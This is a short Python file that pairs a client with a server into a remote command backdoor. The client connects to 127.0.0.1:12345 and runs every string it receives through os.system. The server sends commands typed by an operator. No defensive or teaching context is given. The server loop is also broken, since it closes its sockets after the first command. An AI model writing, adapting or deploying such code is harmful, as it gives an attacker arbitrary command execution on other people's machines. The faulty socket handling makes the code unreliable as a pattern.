def client():
    import socket, os

    def main():
        server_ip = '127.0.0.1'
        server_port = 12345

        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, server_port))

        while True:
            command = client_socket.recv(1024).decode()
            os.system(command)

    if __name__ == "__main__":
        main()
def server():
    import socket

    connections = 0

    def main():
        server_ip = '127.0.0.1'
        server_port = 12345

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((server_ip, server_port))
        server_socket.listen(1)

        print("Server listening on {}:{}".format(server_ip, server_port))

        client_socket, client_address = server_socket.accept()
        print("Connected to client:", client_address)
        while True:
            command = input()
            if command == 'connections':
                print(connections)
            else:
                client_socket.send(command.encode())

            client_socket.close()
            server_socket.close()

    while True:
        main()